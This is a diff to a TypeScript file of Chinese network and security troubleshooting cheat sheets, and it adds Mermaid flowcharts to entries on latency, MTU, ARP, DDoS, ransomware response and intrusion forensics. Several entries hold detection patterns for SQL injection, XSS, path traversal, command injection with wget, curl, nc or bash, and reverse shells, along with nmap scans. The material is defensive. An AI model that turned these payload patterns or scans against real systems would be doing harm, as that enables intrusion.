@@ -87,7 +87,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "分辨到底是网络路径还是服务端问题",
     tags: ["延迟", "抓包", "路由"],
     steps: [
-      { title: "端到端 RTT / 丢包", cmd: "ping -c 20 example.com", tool: "ping" },
+      { title: "端到端 RTT / 丢包", mermaid: `flowchart TD\n    A[业务慢/卡顿] --> B{mtr 丢包?}\n    B -- 丢 --> C[运营商链路/机房]\n    B -- 不丢 --> D{TCP 重传>1%?}\n    D -- 是 --> E[tcpdump 定位断点]\n    D -- 否 --> F{服务端 CPU/带宽?}\n    F -- 是 --> G[top/iftop 定位]\n    F -- 否 --> H[查后端慢SQL/慢接口]`, cmd: "ping -c 20 example.com", tool: "ping" },
       { title: "看路径每一跳", desc: "找出丢包/高延迟出现在哪一跳", cmd: "mtr -rwbzc 30 example.com", tool: "mtr" },
       { title: "确认 TCP 能否建连接", cmd: "nc -zv example.com 443\ntcping example.com 443", tool: "netcat" },
       { title: "抓 handshake 看重传/RST", cmd: "sudo tcpdump -ni any host example.com and port 443 -c 200", tool: "tcpdump" },
@@ -101,7 +101,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "远端端口 → 本地监听 → 进程",
     tags: ["端口", "扫描"],
     steps: [
-      { title: "远端目标端口探测", cmd: "nc -zv target.host 80 443 8080\n# 或 UDP\nnc -zvu target.host 53", tool: "netcat" },
+      { title: "远端目标端口探测", mermaid: `flowchart TD\n    A[端口通?] --> B{本机 nc -zv}\n    B -- 通 --> C[本机 OK]\n    B -- 拒 --> D{进程在听?}\n    D -- 否 --> E[起服务 ss -tlnp]\n    D -- 是 --> F[FW/SG 拦]\n    A2[远端] --> G{nmap -Pn}\n    G -- closed --> H[服务没开]\n    G -- filtered --> I[FW 丢包]\n    G -- open --> J[服务正常]`, cmd: "nc -zv target.host 80 443 8080\n# 或 UDP\nnc -zvu target.host 53", tool: "netcat" },
       { title: "服务/版本识别", cmd: "nmap -sV -Pn -p 80,443,8080 target.host", tool: "nmap" },
       { title: "本机看监听端口", cmd: "sudo lsof -iTCP -sTCP:LISTEN -n -P\nss -tlnp 2>/dev/null || netstat -tlnp", tool: "lsof" },
       { title: "对应到进程/容器", cmd: "sudo lsof -i:8080\ndocker ps --format 'table {{.Names}}\\t{{.Ports}}'" },
@@ -114,7 +114,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "把丢包点从'感觉'变成'第几跳、第几秒'",
     tags: ["丢包", "抖动"],
     steps: [
-      { title: "长时 mtr 记录", desc: "至少跑 5 分钟以捕捉抖动窗口", cmd: "mtr -rwbzc 500 -i 0.5 example.com | tee /tmp/mtr.log", tool: "mtr" },
+      { title: "长时 mtr 记录", mermaid: `flowchart TD\n    A[间歇丢包] --> B{mtr Loss 集中某跳?}\n    B -- 是 --> C[绕过/投诉]\n    B -- 仅末跳 --> D{服务端丢?}\n    D -- 是 --> E[sshd 应用层]\n    D -- 否 --> F{MTU 问题?}\n    F -- 是 --> G[ping -M do 找 PMTU]\n    F -- 否 --> H[内核 socket 复测]`, desc: "至少跑 5 分钟以捕捉抖动窗口", cmd: "mtr -rwbzc 500 -i 0.5 example.com | tee /tmp/mtr.log", tool: "mtr" },
       { title: "并行 ping 多目标", cmd: "for h in 8.8.8.8 1.1.1.1 example.com; do (ping -c 100 $h > /tmp/ping-$h.log 2>&1 &); done" },
       { title: "看是否 MTU 问题", cmd: "ping -c 4 -M do -s 1472 example.com   # 不通就减 -s\ntracepath example.com" },
       { title: "抓 TCP 重传统计", cmd: "sudo tcpdump -ni any 'tcp[13] & 4 != 0 or tcp[13] & 2 != 0' -c 100", tool: "tcpdump" },
@@ -128,7 +128,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "静态资源过期 / 边缘节点异常时的定位链",
     tags: ["cdn", "回源"],
     steps: [
-      { title: "看命中哪个边缘节点", cmd: "curl -sI https://example.com/static.css | grep -iE 'x-cache|via|cf-ray|x-served-by|age'", tool: "curl" },
+      { title: "看命中哪个边缘节点", mermaid: `flowchart TD\n    A[CDN 异常] --> B{边缘对?}\n    B -- 否 --> C[清缓存/预热]\n    B -- 是 --> D{直连源站对?}\n    D -- 否 --> E[源站问题]\n    D -- 是 --> F{ETag 版本不一致?}\n    F -- 是 --> G[源站缓存]\n    F -- 否 --> H[域名解析旁站]`, cmd: "curl -sI https://example.com/static.css | grep -iE 'x-cache|via|cf-ray|x-served-by|age'", tool: "curl" },
       { title: "强制直连源站", cmd: "curl -v --resolve example.com:443:<源站IP> https://example.com/static.css", tool: "curl" },
       { title: "对比源站和边缘的 ETag", cmd: "curl -sI https://example.com/x.js | grep -i etag\ncurl -sI --resolve example.com:443:<源站IP> https://example.com/x.js | grep -i etag" },
       { title: "看 CDN 是否被劫持解析到旁站", cmd: "dig example.com +short\ndig example.com.cdn.example.net +short" },
@@ -177,7 +177,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "证书过期误报 / JWT 失效 / K8s 认证失败常见成因",
     tags: ["ntp", "时间"],
     steps: [
-      { title: "看本机偏差", cmd: "# macOS\nsntp -sS time.apple.com\n# Linux\nchronyc tracking || timedatectl status" },
+      { title: "看本机偏差", mermaid: `flowchart TD\n    A[时间不同步] --> B{偏差多少?}\n    B -- > 60s --> C[TLS/数据库报错]\n    B -- < 1s --> D[可能影响日志/证书]\n    A --> E{chrony 状态?}\n    E -- 异常 --> F[重启服务]\n    E -- 正常 --> G{多 NTP 都偏差?}\n    G -- 是 --> H[换 NTP 源]`, cmd: "# macOS\nsntp -sS time.apple.com\n# Linux\nchronyc tracking || timedatectl status" },
       { title: "强制同步一次", cmd: "sudo sntp -sS time.apple.com          # macOS\nsudo chronyc -a makestep               # chronyd\nsudo systemctl restart systemd-timesyncd" },
       { title: "对比多个 NTP 源", cmd: "for s in ntp.aliyun.com time.apple.com pool.ntp.org; do sntp $s | head -1; done" },
     ],
@@ -190,7 +190,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "分四层定位：服务没起 / 只绑 127.0.0.1 / 防火墙拒 / 安全组拦",
     tags: ["tcp", "端口", "refused"],
     steps: [
-      { title: "服务端确认进程在监听", desc: "看到 0.0.0.0:80 或 :::80 才算对外开放；只有 127.0.0.1:80 = 只允许本机连", cmd: "sudo ss -tlnp | grep :80\n# 老系统\nsudo netstat -tlnp | grep :80", tool: "ss" },
+      { title: "服务端确认进程在监听", mermaid: `flowchart TD\n    A[connection refused] --> B{进程在听?}\n    B -- 否 --> C[起服务]\n    B -- 是 --> D{监听地址}\n    D -- 127.0.0.1 --> E[改 0.0.0.0]\n    D -- 0.0.0.0 --> F{本地能连?}\n    F -- 否 --> G[服务未真起]\n    F -- 是 --> H{防火墙/SG?}\n    H -- 是 --> I[放行]\n    H -- 否 --> J[查路由]`, desc: "看到 0.0.0.0:80 或 :::80 才算对外开放；只有 127.0.0.1:80 = 只允许本机连", cmd: "sudo ss -tlnp | grep :80\n# 老系统\nsudo netstat -tlnp | grep :80", tool: "ss" },
       { title: "服务端本地自测", desc: "本地通、外部不通 → 一定是防火墙或云安全组", cmd: "curl -v http://127.0.0.1:80/\ntelnet 127.0.0.1 80", tool: "curl" },
       { title: "客户端做 TCP 探测", desc: "connection refused = 目标机器收到包但没有服务应答；timeout = 包没到目标（防火墙丢包）", cmd: "nc -vz <server-ip> 80\ntimeout 3 bash -c '</dev/tcp/<server-ip>/80' && echo OK || echo FAIL", tool: "nc" },
       { title: "查本机防火墙", cmd: "# Linux firewalld\nsudo firewall-cmd --list-all\n# iptables\nsudo iptables -L INPUT -n -v --line-numbers\n# nftables\nsudo nft list ruleset | grep -A2 dport\n# ubuntu ufw\nsudo ufw status verbose", tool: "iptables" },
@@ -206,7 +206,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "TCP 握手第一步 SYN 就没回应，从路由 → 防火墙 → 云 ACL 逐层查",
     tags: ["timeout", "tcp", "路由"],
     steps: [
-      { title: "先确认基础连通", desc: "ping 通 + 端口 timeout = 大概率防火墙；ping 也不通 = 路由问题", cmd: "ping -c 4 <server-ip>\nnc -vz -w 5 <server-ip> 443", tool: "ping" },
+      { title: "先确认基础连通", mermaid: `flowchart TD\n    A[timeout] --> B{ping 通?}\n    B -- 否 --> C[路由问题 mtr]\n    B -- 是 --> D{SYN 被过滤?}\n    D -- 无 SYN --> E[FW/NACL 丢包]\n    D -- 有 RST --> F[对端拒]\n    A2[换热点] --> G{能连?}\n    G -- 能 --> H[本地 ISP]\n    G -- 不能 --> I[目标端 EIP/路由]`, desc: "ping 通 + 端口 timeout = 大概率防火墙；ping 也不通 = 路由问题", cmd: "ping -c 4 <server-ip>\nnc -vz -w 5 <server-ip> 443", tool: "ping" },
       { title: "traceroute 看在哪跳丢", desc: "最后能看到的那一跳的下一跳就是问题点；连续 *** 通常是运营商拦截或 ICMP 被限速（不代表真的不通）", cmd: "# Linux\nsudo traceroute -T -p 443 <server-ip>\n# macOS TCP 探测\nsudo traceroute -P TCP -p 443 <server-ip>", tool: "traceroute" },
       { title: "mtr 持续观察", desc: "Loss% 集中在某一跳 = 那一跳丢包；只有最后一跳 loss = 目标机器丢包", cmd: "sudo mtr -rwc 30 -P 443 -T <server-ip>", tool: "mtr" },
       { title: "看是否是 SYN 被过滤", desc: "只发不收 = 中间设备吃了；有 RST = 对端明确拒", cmd: "sudo tcpdump -nn -i any host <server-ip> and port 443 -c 20", tool: "tcpdump" },
@@ -222,7 +222,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "用 tcpdump + Wireshark 看重传率，判断是丢包还是应用慢",
     tags: ["tcpdump", "wireshark", "重传"],
     steps: [
-      { title: "服务端抓 60s 流量", cmd: "sudo tcpdump -nn -i any host <client-ip> -w /tmp/cap.pcap &\nsleep 60; sudo kill %1", tool: "tcpdump" },
+      { title: "服务端抓 60s 流量", mermaid: `flowchart TD\n    A[时通时不通] --> B{重传率}\n    B -- >5% --> C[机房问题]\n    B -- 1-5% --> D{RTT 突跳?}\n    D -- 是 --> E[中间拥塞]\n    B -- < 1% --> F{Zero Window?}\n    F -- 是 --> G[应用消费慢]\n    F -- 否 --> H[内核 socket 复测]`, cmd: "sudo tcpdump -nn -i any host <client-ip> -w /tmp/cap.pcap &\nsleep 60; sudo kill %1", tool: "tcpdump" },
       { title: "统计重传率", desc: "重传 > 1% 就明显异常；> 5% 用户已经能感受到卡", cmd: "tshark -r /tmp/cap.pcap -q -z io,stat,10,\"tcp.analysis.retransmission\"\ntshark -r /tmp/cap.pcap -Y 'tcp.analysis.retransmission' | wc -l", tool: "wireshark" },
       { title: "看 RTT 波动", desc: "RTT 突然从 30ms 跳到 500ms = 中间链路拥塞", cmd: "tshark -r /tmp/cap.pcap -q -z io,stat,1,\"AVG(tcp.analysis.ack_rtt)tcp.analysis.ack_rtt\"" },
       { title: "看是否有 Zero Window", desc: "接收端处理不过来在告诉发送端「先别发」= 应用消费太慢，不是网络问题", cmd: "tshark -r /tmp/cap.pcap -Y 'tcp.window_size == 0'" },
@@ -238,7 +238,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "SSH 能连但 scp 卡死、SSL 握手一半断——典型 MTU/PMTUD 问题",
     tags: ["mtu", "分片", "pmtud"],
     steps: [
-      { title: "先复现症状", desc: "ping 小包通、大包不通 = MTU 问题实锤", cmd: "ping -c 3 -s 56  <target>    # 84 字节，通\nping -c 3 -s 1400 <target>   # 1428 字节，可能通\nping -c 3 -s 1472 <target>   # 1500 字节，通常这里断" },
+      { title: "先复现症状", mermaid: `flowchart TD\n    A[小包通大包卡] --> B{ping -s 1472 通?}\n    B -- 否 --> C[MTU 黑洞]\n    C --> D[VPN/PPPoE/隧道]\n    D --> E[降 MTU 到 1400]\n    B -- 通 --> F[不是 MTU]\n    A2[永久修] --> G[网关 MSS clamp]`, desc: "ping 小包通、大包不通 = MTU 问题实锤", cmd: "ping -c 3 -s 56  <target>    # 84 字节，通\nping -c 3 -s 1400 <target>   # 1428 字节，可能通\nping -c 3 -s 1472 <target>   # 1500 字节，通常这里断" },
       { title: "禁分片探测最大 MTU", desc: "从 1472 往下试，能通的最大值 + 28 = 实际 MTU", cmd: "# Linux\nping -M do -s 1472 -c 3 <target>\nping -M do -s 1400 -c 3 <target>\n# macOS\nping -D -s 1472 <target>" },
       { title: "看本机接口 MTU", cmd: "ip link show | grep mtu\nifconfig | grep -i mtu", tool: "ip" },
       { title: "临时降 MTU 验证", desc: "常见值：VPN 1420 / PPPoE 1492 / 隧道封装 1400", cmd: "sudo ip link set dev eth0 mtu 1400   # Linux\nsudo ifconfig en0 mtu 1400            # macOS" },
@@ -253,7 +253,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "同一 IP 被两台机器抢，或网关 MAC 突然变了",
     tags: ["arp", "冲突", "网关"],
     steps: [
-      { title: "看本机 ARP 表", desc: "同一 IP 出现两个 MAC = 有冲突；网关 MAC 变化 = 可能被 ARP 欺骗", cmd: "arp -an\nip neigh show", tool: "ip" },
+      { title: "看本机 ARP 表", mermaid: `flowchart TD\n    A[IP 冲突] --> B{同 IP 两 MAC?}\n    B -- 是 --> C[IP 撞车]\n    B -- 网关 MAC 变 --> D[ARP 欺骗/DAI]\n    B -- 正常 --> E{dmesg 冲突?}\n    E -- 是 --> F[DHCP 池冲]\n    E -- 否 --> G[tcpdump arp]`, desc: "同一 IP 出现两个 MAC = 有冲突；网关 MAC 变化 = 可能被 ARP 欺骗", cmd: "arp -an\nip neigh show", tool: "ip" },
       { title: "看系统日志报冲突", cmd: "# Linux\nsudo dmesg | grep -i 'arp\\|duplicate'\nsudo journalctl -k | grep -i duplicate\n# macOS\nlog show --last 10m --predicate 'process == \"kernel\"' | grep -i arp" },
       { title: "扫本网段找出对手", desc: "看谁抢了这个 IP、他的 MAC 属于哪个厂商", cmd: "sudo arp-scan --interface=eth0 --localnet\nsudo nmap -sn 192.168.1.0/24", tool: "arp-scan" },
       { title: "抓包定位 gratuitous ARP", cmd: "sudo tcpdump -nn -e -i any arp", tool: "tcpdump" },
@@ -268,7 +268,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "信号 / 信道干扰 / 频段 / 漫游 / DNS 五个维度",
     tags: ["wifi", "无线", "慢"],
     steps: [
-      { title: "看当前连的 AP 信号", desc: "RSSI > -60 dBm 优 / -70 可用 / < -75 明显慢", cmd: "# macOS（Sonoma 前）\n/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I\n# Sonoma+ 用系统信息\nsystem_profiler SPAirPortDataType | grep -A5 Current\n# Linux\niw dev wlan0 link" },
+      { title: "看当前连的 AP 信号", mermaid: `flowchart TD\n    A[Wi-Fi 慢] --> B{RSSI 信号}\n    B -- > -60dBm --> C[信号 OK]\n    B -- < -75dBm --> D[挪近/换 AP]\n    A2[同信道挤?] --> E[airport -s]\n    A3[speedtest] --> F[Wi-Fi vs 有线]\n    F -- 无线慢 --> G[无线问题]\n    F -- 都慢 --> H[上游/ISP]`, desc: "RSSI > -60 dBm 优 / -70 可用 / < -75 明显慢", cmd: "# macOS（Sonoma 前）\n/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I\n# Sonoma+ 用系统信息\nsystem_profiler SPAirPortDataType | grep -A5 Current\n# Linux\niw dev wlan0 link" },
       { title: "扫周围信道占用", desc: "同信道 3 家以上 = 挤；2.4G 只用 1/6/11 不冲突", cmd: "sudo airport -s\nsudo iw dev wlan0 scan | grep -E 'signal|freq|SSID'" },
       { title: "跑速测", desc: "有线 200Mbps + Wi-Fi 20Mbps = 无线问题；两个都低 = 上游或 ISP", cmd: "speedtest-cli --simple\niperf3 -c <本地路由 iperf 端> -t 10" },
       { title: "5GHz 强制", desc: "路由器把 2.4G 和 5G 拆成不同 SSID，手动连 5G 那个" },
@@ -283,7 +283,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "确认代理进程 / TUN / 规则命中 / DNS 泄漏",
     tags: ["clash", "proxy", "代理"],
     steps: [
-      { title: "确认代理端口在监听", cmd: "lsof -iTCP:7897 -sTCP:LISTEN\ncurl -x http://127.0.0.1:7897 -sI https://www.google.com" },
+      { title: "确认代理端口在监听", mermaid: `flowchart TD\n    A[代理不通] --> B{7897 端口在听?}\n    B -- 否 --> C[启动 Clash]\n    B -- 是 --> D{Dashboard 通?}\n    D -- 否 --> E[API 鉴权]\n    D -- 是 --> F{规则命中对?}\n    F -- 国内走代理 --> G[改 rules]\n    F -- 国外 DIRECT --> H[TUN 模式\n--grant-permission]`, cmd: "lsof -iTCP:7897 -sTCP:LISTEN\ncurl -x http://127.0.0.1:7897 -sI https://www.google.com" },
       { title: "看系统代理有没有设对", cmd: "# macOS 全局代理状态\nscutil --proxy\n# 环境变量\necho $http_proxy $https_proxy $ALL_PROXY" },
       { title: "测规则命中", desc: "看 Clash Dashboard → Connections，实时看每条请求走了哪个节点或 DIRECT", cmd: "# API 拉当前连接\ncurl -s http://127.0.0.1:9090/connections | jq '.connections[] | {host, rule, chains}'" },
       { title: "查 DNS 泄漏", desc: "国内域名走了代理 = 慢；国外域名走了 DIRECT = 不通", cmd: "curl -s --resolve www.google.com:443:1.1.1.1 https://www.google.com -o /dev/null -w '%{http_code}\\n'\ndig @127.0.0.1 -p 53 google.com" },
@@ -298,7 +298,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "系统偏好 IPv6，但 IPv6 没真通，Happy Eyeballs 超时后才回落",
     tags: ["ipv6", "happy eyeballs"],
     steps: [
-      { title: "看是否拿到公网 IPv6", desc: "有 2xxx: 开头才是公网 v6；只有 fe80:: 是本地 link", cmd: "# macOS\nifconfig | grep 'inet6' | grep -v fe80 | grep -v '::1'\n# Linux\nip -6 addr show scope global" },
+      { title: "看是否拿到公网 IPv6", mermaid: `flowchart TD\n    A[v6 半通] --> B{拿到公网 v6?}\n    B -- 仅 fe80 --> C[运营商没给]\n    B -- 2xxx --> D{curl -6 ipv6.google?}\n    D -- 通 --> E[查 AAAA]\n    D -- timeout --> F{对比 v4 延迟}\n    F -- v6 慢 --> G[路由绕远]\n    A2[临时关] --> H[setv6off 验证]`, desc: "有 2xxx: 开头才是公网 v6；只有 fe80:: 是本地 link", cmd: "# macOS\nifconfig | grep 'inet6' | grep -v fe80 | grep -v '::1'\n# Linux\nip -6 addr show scope global" },
       { title: "测 v6 出口", cmd: "curl -6 -v https://ipv6.google.com\ncurl -s https://test-ipv6.com/ip/?callback=x" },
       { title: "对比 v4/v6 延迟", cmd: "ping6 -c 5 ipv6.google.com\nping  -c 5 ipv4.google.com" },
       { title: "看 DNS 有没有返回 AAAA", cmd: "dig www.example.com A     +short\ndig www.example.com AAAA  +short" },
@@ -313,7 +313,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "先看总量 → 定位进程 → 定位连接 → 抓包看内容",
     tags: ["带宽", "iftop", "nethogs"],
     steps: [
-      { title: "看接口总带宽", cmd: "# 实时\nsudo iftop -i eth0 -n\nsudo nload eth0\n# 历史\nsar -n DEV 1 5", tool: "iftop" },
+      { title: "看接口总带宽", mermaid: `flowchart TD\n    A[带宽打满] --> B{iftop/nload 实速到顶?}\n    B -- 是 --> C{nethogs 谁在吃?}\n    C --> D[具体进程]\n    D --> E{ipinfo 归属}\n    E --> F[SYN 多?}\n    F -- 是 --> G[被扫/被打\n限流+封 IP]`, cmd: "# 实时\nsudo iftop -i eth0 -n\nsudo nload eth0\n# 历史\nsar -n DEV 1 5", tool: "iftop" },
       { title: "定位是哪个进程在吃", cmd: "sudo nethogs eth0\nsudo iotop -oPa   # 磁盘 IO 顺便看" },
       { title: "看具体是哪些连接", cmd: "sudo ss -tunap | awk 'NR>1 {print $6}' | sort | uniq -c | sort -rn | head\nsudo iftop -i eth0 -P -N -n" },
       { title: "反查对端 IP 归属", cmd: "curl -s https://ipinfo.io/<ip>\nwhois <ip> | grep -iE 'orgname|country|netname'" },
@@ -329,7 +329,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "把「打开慢」拆成 DNS/TCP/TLS/首字节/下载 5 段耗时",
     tags: ["curl", "延迟", "http"],
     steps: [
-      { title: "一行 curl 出 5 段耗时", desc: "namelookup = DNS；connect - namelookup = TCP；appconnect - connect = TLS；starttransfer - appconnect = 服务端处理（后端慢）；total - starttransfer = 下载", cmd: "curl -o /dev/null -s -w 'dns:%{time_namelookup}\\nconnect:%{time_connect}\\ntls:%{time_appconnect}\\nttfb:%{time_starttransfer}\\ntotal:%{time_total}\\n' https://example.com/", tool: "curl" },
+      { title: "一行 curl 出 5 段耗时", mermaid: `flowchart TD\n    A[curl 5 段] --> B{DNS > 100ms?}\n    B -- 是 --> C[换 DNS]\n    B -- 否 --> D{TCP 慢?}\n    D -- 是 --> E[mtr 找慢链路]\n    D -- 否 --> F{TLS 慢?}\n    F -- 是 --> G[OCSP/证书链]\n    F -- 否 --> H{TTFB 慢?}\n    H -- 是 --> I[后端慢 upstream]\n    H -- 否 --> J{下载慢?}\n    J -- 是 --> K[带宽/CDN]`, desc: "namelookup = DNS；connect - namelookup = TCP；appconnect - connect = TLS；starttransfer - appconnect = 服务端处理（后端慢）；total - starttransfer = 下载", cmd: "curl -o /dev/null -s -w 'dns:%{time_namelookup}\\nconnect:%{time_connect}\\ntls:%{time_appconnect}\\nttfb:%{time_starttransfer}\\ntotal:%{time_total}\\n' https://example.com/", tool: "curl" },
       { title: "对照参考值", desc: "国内正常：DNS<50ms、TCP<50ms、TLS<150ms、TTFB<300ms。任何一段超标 → 定位那一层" },
       { title: "DNS 慢 → 换 DNS 或走 hosts", cmd: "dig example.com | grep 'Query time'\n# 临时绕过\ncurl --resolve example.com:443:<ip> https://example.com/" },
       { title: "TCP 慢 → 走跨境或链路差", cmd: "mtr -rwc 20 -T -P 443 example.com" },
@@ -349,7 +349,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "先看攻击类型 / 量级，再决定挡在哪一层",
     tags: ["ddos", "应急"],
     steps: [
-      { title: "确认攻击层：L3/4 还是 L7", cmd: "# 服务器视角看连接数暴涨\nss -s\nss -Htan state syn-recv | wc -l           # SYN flood\nss -Htan state established | wc -l", tool: "ss" },
+      { title: "确认攻击层：L3/4 还是 L7", mermaid: `flowchart TD\n    A[DDoS 在打] --> B{L3/4 vs L7?}\n    B -- SYN flood --> C[SYN cookies\nSYN proxy]\n    B -- UDP flood --> D[丢/限流\n联系机房]\n    B -- L7 CC --> E[热点 URL/UA]\n    E --> F[封 UA/IP]\n    F --> G[高防/CDN]\n    A2[止血] --> H[临时换高防\n切静态页]`, cmd: "# 服务器视角看连接数暴涨\nss -s\nss -Htan state syn-recv | wc -l           # SYN flood\nss -Htan state established | wc -l", tool: "ss" },
       { title: "抓 60s 流量看 TOP 源 IP", cmd: "sudo timeout 60 tcpdump -ni any -w /tmp/attack.pcap 'port 80 or port 443'\ntshark -r /tmp/attack.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20", tool: "tshark" },
       { title: "L7 CC 攻击 → 找热点 URL / UA", cmd: "rg -o '\"\\S+ \\S+' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head\nrg -o 'HTTP/[0-9.]+\"[^\"]+\"[^\"]+\"[^\"]+\"' /var/log/nginx/access.log | ..." },
       { title: "限速 / 封禁 IP（快速止血）", cmd: "# iptables 限速\nsudo iptables -I INPUT -p tcp --dport 443 -m connlimit --connlimit-above 100 -j DROP\n# 封单 IP\nsudo iptables -I INPUT -s 1.2.3.4 -j DROP\n# 批量封\ncat bad_ips.txt | xargs -I{} sudo iptables -I INPUT -s {} -j DROP" },
@@ -391,7 +391,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "从日志里揪出 SQL 注入 / XSS / 扫描 / 目录遍历",
     tags: ["日志", "web", "取证"],
     steps: [
-      { title: "SQL 注入特征", cmd: "rg -iE 'union.*select|select.+from|sleep\\(|benchmark\\(|or 1=1|and 1=1' /var/log/nginx/access.log | head -20", tool: "ripgrep" },
+      { title: "SQL 注入特征", mermaid: `flowchart TD\n    A[access.log] --> B{URL 关键词}\n    B -- union/select --> C[SQL 注入]\n    B -- script/onload --> D[XSS]\n    B -- ../etc/passwd --> E[路径穿越]\n    B -- wp-admin --> F[扫描器]\n    C --> G[封 IP+WAF]\n    D --> G\n    E --> G\n    F --> G`, cmd: "rg -iE 'union.*select|select.+from|sleep\\(|benchmark\\(|or 1=1|and 1=1' /var/log/nginx/access.log | head -20", tool: "ripgrep" },
       { title: "XSS 特征", cmd: "rg -iE '<script|onerror=|onload=|javascript:|alert\\(|document\\.cookie' /var/log/nginx/access.log | head -20" },
       { title: "目录遍历 / 敏感路径", cmd: "rg -E '\\.\\./|/etc/passwd|/proc/self|\\.git/|\\.env|\\.svn/|/wp-admin|/phpmyadmin' /var/log/nginx/access.log | head -20" },
       { title: "命令注入 / RCE", cmd: "rg -iE ';cat |;wget |;curl |\\|nc |\\|bash|/bin/sh|\\$\\(.*\\)|`.*`' /var/log/nginx/access.log | head -20" },
@@ -407,7 +407,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "静态特征 + 时间线 + 反连行为三管齐下",
     tags: ["webshell", "入侵"],
     steps: [
-      { title: "近 24h 新增的 PHP/JSP 文件", cmd: "find /var/www -type f \\( -name '*.php' -o -name '*.jsp' -o -name '*.aspx' \\) -mtime -1 -ls" },
+      { title: "近 24h 新增的 PHP/JSP 文件", mermaid: `flowchart TD\n    A[疑似 Webshell] --> B{近 24h 新文件?}\n    B --> C[可疑 PHP/JSP]\n    C --> D[看 eval/system]\n    D --> E[查 .user.ini/htaccess]\n    E --> F{溯源日志}\n    F --> G[定位上传入口]`, cmd: "find /var/www -type f \\( -name '*.php' -o -name '*.jsp' -o -name '*.aspx' \\) -mtime -1 -ls" },
       { title: "危险函数扫", cmd: "rg -n --no-ignore -E 'eval\\(|assert\\(|system\\(|passthru\\(|shell_exec\\(|base64_decode\\(|preg_replace.*\\/e|Runtime\\.getRuntime' /var/www 2>/dev/null | head -50" },
       { title: "小体积可疑文件（一句话）", cmd: "find /var/www -type f -name '*.php' -size -2k -exec grep -l 'eval\\|assert\\|base64_decode' {} \\;" },
       { title: "看是否有反连", cmd: "sudo netstat -tnpa | rg ESTABLISHED | rg -v ':22 \\|:443 \\|:80 '\nsudo lsof -i -n -P | rg -i 'nc\\|bash\\|php\\|python\\|perl'" },
@@ -423,7 +423,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "CPU 打满 + 高流量 + 奇怪进程",
     tags: ["挖矿", "入侵"],
     steps: [
-      { title: "看是谁把 CPU 吃满", cmd: "top -bn1 -o %CPU | head -25\nps -eo pid,ppid,user,%cpu,%mem,cmd --sort=-%cpu | head -15" },
+      { title: "看是谁把 CPU 吃满", mermaid: `flowchart TD\n    A[CPU 100] --> B{top -bn1 谁在跑?}\n    B --> C{进程类型}\n    C -- 应用进程 --> D[查线程\nperf/pstack]\n    C -- kdevtmpfs/xmrig --> E[挖矿木马]\n    C -- java/python --> F[业务慢循环]\n    D --> G[strace 看 syscall]\n    E --> H[清计划任务]`, cmd: "top -bn1 -o %CPU | head -25\nps -eo pid,ppid,user,%cpu,%mem,cmd --sort=-%cpu | head -15" },
       { title: "看是否连接矿池", desc: "常见矿池端口 3333/4444/5555/7777/14444/45560", cmd: "sudo lsof -i -n -P | rg -E ':(3333|4444|5555|7777|14444|45560)'\nsudo ss -tnp | rg -E ':(3333|4444|5555|7777|14444)'" },
       { title: "看进程真实路径 + hash", cmd: "sudo ls -la /proc/<pid>/exe\nsudo cat /proc/<pid>/cmdline; echo\nsudo sha256sum /proc/<pid>/exe" },
       { title: "查该 hash 是否已知恶意", cmd: "# 拿 sha256 去 VirusTotal 或微步在线查\n# https://www.virustotal.com/gui/search/<sha256>\n# https://s.threatbook.com/#/domain/<sha256>" },
@@ -439,7 +439,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "先断网 · 再取证 · 最后再谈恢复。任何情况下不要付款",
     tags: ["勒索", "应急"],
     steps: [
-      { title: "第 1 分钟：物理/逻辑断网", desc: "拔线或防火墙 DROP，防止横向扩散和二次加密", cmd: "sudo iptables -P INPUT DROP\nsudo iptables -P OUTPUT DROP\nsudo iptables -P FORWARD DROP\nsudo iptables -I INPUT -s <管理机IP> -j ACCEPT   # 保留应急通道" },
+      { title: "第 1 分钟：物理/逻辑断网", mermaid: `flowchart TD\n    A[文件被加密] --> B{立即断网}\n    B --> C[隔离主机]\n    C --> D{找样本后缀}\n    D --> E[.lock/.cryp/.wncry]\n    E --> F[查 ID-Ransomware]\n    F --> G{有没有备份?}\n    G -- 是 --> H[断电重装\n还原备份]\n    G -- 否 --> I[不付赎金\n保存样本]`, desc: "拔线或防火墙 DROP，防止横向扩散和二次加密", cmd: "sudo iptables -P INPUT DROP\nsudo iptables -P OUTPUT DROP\nsudo iptables -P FORWARD DROP\nsudo iptables -I INPUT -s <管理机IP> -j ACCEPT   # 保留应急通道" },
       { title: "看加密器进程和文件写入", cmd: "sudo lsof | rg -i 'encrypted\\|\\.locked\\|\\.crypt\\|README\\|HOW_TO' | head\nsudo iotop -bn 2 -o | head -20      # 看谁在疯狂写盘" },
       { title: "识别勒索家族（找勒索信）", cmd: "find / -maxdepth 5 -type f \\( -iname 'ransom*' -o -iname 'readme*' -o -iname 'how_to*' -o -iname '*decrypt*' \\) 2>/dev/null | head" },
       { title: "上传样本到勒索识别站", cmd: "# https://id-ransomware.malwarehunterteam.com/\n# 或 https://www.nomoreransom.org/  可能有免费解密工具" },
@@ -455,7 +455,7 @@ export const cheatsheets: Cheatsheet[] = [
     summary: "抓大流量 / 长连接 / 陌生外发目的地",
     tags: ["数据泄露", "取证"],
     steps: [
